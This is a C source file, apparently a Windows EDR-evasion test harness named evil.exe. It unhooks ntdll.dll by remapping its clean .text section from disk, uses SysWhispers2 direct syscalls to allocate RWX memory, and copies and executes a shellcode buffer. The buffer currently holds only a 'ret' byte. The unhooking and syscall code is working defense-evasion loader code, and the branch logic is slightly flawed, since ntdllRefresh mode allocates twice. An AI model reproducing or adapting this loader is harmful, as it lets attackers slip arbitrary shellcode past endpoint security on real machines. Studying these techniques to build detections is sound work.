#include "syswhispers2/syscalls.h"
#include <windows.h>
//#include <winternl.h>
#include <psapi.h>
#include <stdio.h>


//https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
void unhookntdll()
{
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi;
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
	
	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		
		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		
        }
	}
	
	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);

    printf("NTDLL UNHOOKED \n");
}

int main(int argc, char **argv){

    char shellcode[] = "\xc3";
	LPVOID allocation_start;
	SIZE_T allocation_size = sizeof(shellcode);
    printf("pid: %i\n",_getpid());

	if(argc < 2){
		printf("Usage: evil.exe <nothing|ntdllRefresh|direct>\n");
		return;
	}

	Sleep(4000);

	if(strcmp(argv[1],"ntdllRefresh")==0){
		printf("[ntdllRefresh]\n");
		unhookntdll();
		allocation_start = VirtualAlloc(0, sizeof (shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	}

	if(strcmp(argv[1],"direct")==0){
		printf("[direct]\n");
		FindSyscallInstructionNTDLL();
		NtAllocateVirtualMemory(GetCurrentProcess(), &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}
	else{
		printf("[No bypass]\n");
		allocation_start = VirtualAlloc(0, sizeof (shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	}
	


    printf("exec %p\n",allocation_start);
	memcpy(allocation_start, shellcode, sizeof shellcode);

    printf("memcpy \n");
	((void(*)())allocation_start)();
    
    printf("end \n");
    return 0;
}